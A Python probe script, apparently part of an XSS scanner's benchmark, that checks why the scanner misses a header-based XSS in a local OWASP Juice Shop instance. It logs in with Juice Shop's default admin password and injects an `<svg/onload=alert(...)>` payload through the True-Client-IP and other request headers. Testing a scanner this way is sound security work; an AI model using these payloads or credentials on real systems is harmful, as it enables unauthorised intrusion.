"""Phase 170: where exactly does the header-XSS path break on a real target?

`_scan_header_xss` (core/layers/transport_layers.py:21) iterates
`INJECTABLE_HEADERS[:6]` -- the first six names only.  `True-Client-IP`, the
header Juice Shop's HTTP-Header XSS actually reads, is the SEVENTH entry, so it
is never sent.

This probe asks the next question: if the header were included, would the rest
of the path (reflection analysis -> semantic confirmation) actually fire?  Two
break points are possible and they need different fixes.

Usage: python -m benchmark.probe_header_gap [port]   (Juice Shop must be up)
"""
from __future__ import annotations

import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from xssentinel.core import header_xss as header_mod  # noqa: E402
from xssentinel.core import verifier  # noqa: E402


def _login(base: str) -> str:
    import urllib.request
    req = urllib.request.Request(
        f"{base}/rest/user/login",
        data=json.dumps({"email": "admin@juice-sh.op",
                         "password": "admin123"}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())["authentication"]["token"]


def _get(base: str, jwt: str, header: str, payload: str) -> str:
    import urllib.request
    req = urllib.request.Request(f"{base}/rest/saveLoginIp", method="GET")
    req.add_header("Authorization", f"Bearer {jwt}")
    req.add_header(header, payload)
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read().decode("utf-8", "replace")


def main() -> int:
    base = f"http://127.0.0.1:{sys.argv[1] if len(sys.argv) > 1 else 3000}"
    jwt = _login(base)
    token = "xsshd_" + "170abc"
    payload = f"<svg/onload=alert('{token}')>"

    print("INJECTABLE_HEADERS order:")
    for i, h in enumerate(header_mod.INJECTABLE_HEADERS):
        mark = "  <-- cut by [:6]" if i == 6 else ""
        if i < 10:
            print(f"  [{i}] {h}{mark}")

    print(f"\nsending True-Client-IP: {payload}")
    text = _get(base, jwt, "True-Client-IP", payload)
    print("response (first 120):", text[:120])

    r = header_mod.analyze_response(text, "True-Client-IP", token)
    print("\nanalyze_response ->", json.dumps(r, ensure_ascii=False)[:200])

    v = verifier.verify_semantic(text, token)
    print("verify_semantic -> confirmed=", v.get("confirmed"),
          "context=", v.get("context"), "detail=", str(v.get("detail"))[:90])

    # and, for contrast, what the layer's own top-6 headers look like on the
    # same endpoint (they are sent, but is anything reflected?)
    print("\ntop-6 headers actually probed by the layer:")
    for h in header_mod.INJECTABLE_HEADERS[:6]:
        t = "xsshd_" + h[:3].lower()
        p = f"<svg/onload=alert('{t}')>"
        try:
            txt = _get(base, jwt, h, p)
            rr = header_mod.analyze_response(txt, h, t)
            print(f"  {h:20s} reflected={rr.get('reflected')} "
                  f"context={rr.get('context_hint')}")
        except Exception as exc:  # noqa: BLE001
            print(f"  {h:20s} error: {str(exc)[:50]}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
